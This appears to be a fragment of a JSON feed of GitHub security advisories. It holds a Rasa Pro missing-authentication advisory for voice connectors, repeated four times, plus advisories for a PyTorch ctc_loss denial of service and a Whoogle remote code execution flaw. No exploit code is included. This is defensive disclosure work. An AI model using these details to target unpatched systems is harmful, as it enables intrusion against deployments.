            "content_html": "<h2 id=\"vulnerability\">Vulnerability</h2>\n<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>\n<p>This impacts the following connectors:</p>\n<ul>\n<li><code>audiocodes_stream</code></li>\n<li><code>genesys</code></li>\n<li><code>jambonz</code></li>\n</ul>\n<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>\n<ul>\n<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>\n<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>\n</ul>\n<h2 id=\"fix\">Fix</h2>\n<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>\n<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32377\">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg",
            "title": "[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs",
            "date_modified": "2025-04-23T14:34:47.000Z",
            "date_published": "2025-04-17T18:33:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"vulnerability\">Vulnerability</h2>\n<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>\n<p>This impacts the following connectors:</p>\n<ul>\n<li><code>audiocodes_stream</code></li>\n<li><code>genesys</code></li>\n<li><code>jambonz</code></li>\n</ul>\n<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>\n<ul>\n<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>\n<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>\n</ul>\n<h2 id=\"fix\">Fix</h2>\n<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>\n<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32377\">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg",
            "title": "[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs",
            "date_modified": "2025-04-23T14:34:47.000Z",
            "date_published": "2025-04-17T18:33:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"vulnerability\">Vulnerability</h2>\n<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>\n<p>This impacts the following connectors:</p>\n<ul>\n<li><code>audiocodes_stream</code></li>\n<li><code>genesys</code></li>\n<li><code>jambonz</code></li>\n</ul>\n<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>\n<ul>\n<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>\n<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>\n</ul>\n<h2 id=\"fix\">Fix</h2>\n<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>\n<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32377\">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg",
            "title": "[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs",
            "date_modified": "2025-04-23T14:34:47.000Z",
            "date_published": "2025-04-17T18:33:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"vulnerability\">Vulnerability</h2>\n<p>A vulnerability has been identified in Rasa Pro where voice connectors in Rasa Pro do not properly implement authentication even when a token is configured in the <code>credentials.yml</code> file. This could allow an attacker to submit voice data to the Rasa Pro assistant from an unauthenticated source.</p>\n<p>This impacts the following connectors:</p>\n<ul>\n<li><code>audiocodes_stream</code></li>\n<li><code>genesys</code></li>\n<li><code>jambonz</code></li>\n</ul>\n<p>As part of our investigation to resolve this issue, we have also performed a security review of our other voice channel connectors:</p>\n<ul>\n<li><code>browser_audio</code>: Does not support authentication. This is a development channel not intended for production use.</li>\n<li><code>twilio_media_streams</code>, <code>twilio_voice</code> and <code>jambonz</code>: Authentication is currently not supported by these channels, but our investigation has found a way for us to enable it for these voice channel connectors in a future Rasa Pro release.</li>\n</ul>\n<h2 id=\"fix\">Fix</h2>\n<p>The issue has been resolved for <code>audiocodes</code>, <code>audiocodes_stream</code>, and <code>genesys</code> connectors. Fixed versions of Rasa Pro have been released for <code>3.9.20</code>, <code>3.10.19</code>, <code>3.11.7</code> and <code>3.12.6</code>. Please update to a fixed release.</p>\n<p>If you are using one of the affected connectors, we strongly recommend upgrading to a fixed version. For connectors where authentication is not supported (e.g., Twilio), we suggest taking extra caution and considering other compensating controls if applicable.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/rasa-pro-security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/RasaHQ/security-advisories/security/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32377\">https://nvd.nist.gov/vuln/detail/CVE-2025-32377</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7xq5-54jp-2mfg\">https://github.com/advisories/GHSA-7xq5-54jp-2mfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg",
            "title": "[rasa-pro] Rasa Pro Missing Authentication For Voice Connector APIs",
            "date_modified": "2025-04-23T14:34:47.000Z",
            "date_published": "2025-04-17T18:33:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7xq5-54jp-2mfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-3730\">https://nvd.nist.gov/vuln/detail/CVE-2025-3730</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/issues/150835\">https://github.com/pytorch/pytorch/issues/150835</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/pull/150981\">https://github.com/pytorch/pytorch/pull/150981</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.305076\">https://vuldb.com/?ctiid.305076</a></li>\n<li><a href=\"https://vuldb.com/?id.305076\">https://vuldb.com/?id.305076</a></li>\n<li><a href=\"https://vuldb.com/?submit.553645\">https://vuldb.com/?submit.553645</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af\">https://github.com/pytorch/pytorch/commit/01f226bfb8f2c343f5c614a6bbf685d91160f3af</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-887c-mr87-cxwp\">https://github.com/advisories/GHSA-887c-mr87-cxwp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-887c-mr87-cxwp",
            "title": "[torch] PyTorch Improper Resource Shutdown or Release vulnerability",
            "date_modified": "2025-04-16T21:55:38.000Z",
            "date_published": "2025-04-16T21:30:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-887c-mr87-cxwp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue in the component /models/config.py of Whoogle search v0.9.0 allows attackers to execute arbitrary code via supplying a crafted search query.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53305\">https://nvd.nist.gov/vuln/detail/CVE-2024-53305</a></li>\n<li><a href=\"https://github.com/benbusby/whoogle-search/commit/223f00c3c0533423114f99b30c561278bc0b42ba\">https://github.com/benbusby/whoogle-search/commit/223f00c3c0533423114f99b30c561278bc0b42ba</a></li>\n<li><a href=\"https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651\">https://gist.github.com/fern89/ca5fe76ad81b4bc363e7341e523a1651</a></li>\n<li><a href=\"https://fern89.github.io/posts/whoogle-rce\">https://fern89.github.io/posts/whoogle-rce</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2689-cw26-6cpj\">https://github.com/advisories/GHSA-2689-cw26-6cpj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2689-cw26-6cpj",
            "title": "[whoogle-search] Whoogle allows attackers to execute arbitrary code via supplying a crafted search query",
            "date_modified": "2025-04-16T20:38:01.000Z",
            "date_published": "2025-04-16T18:31:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2689-cw26-6cpj"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}